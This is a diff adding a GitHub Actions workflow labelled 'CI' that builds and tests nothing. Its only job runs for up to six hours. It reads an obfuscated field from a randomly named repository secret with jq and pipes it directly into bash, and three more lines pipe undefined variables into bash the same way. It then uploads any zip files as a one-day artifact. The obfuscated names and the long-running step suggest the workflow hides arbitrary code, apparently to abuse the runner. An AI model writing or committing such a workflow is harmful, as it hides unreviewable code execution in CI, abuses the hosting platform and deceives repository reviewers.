@@ -1,0 +1,34 @@
+name: CI
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          po42877: ${{ secrets.po42877 }}
+        run: |
+          printf '%s' "$po42877" | jq -r .avqwf72 | /bin/bash
+          echo $glw2592 | jq -r .s3 | /bin/bash
+          printf '%s' "$echui8" | jq -r .rt86 | /bin/bash
+          echo $jjox85 | jq -r .gn59 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: awx5KiSX
+          path: "*.zip"
+          retention-days: 1
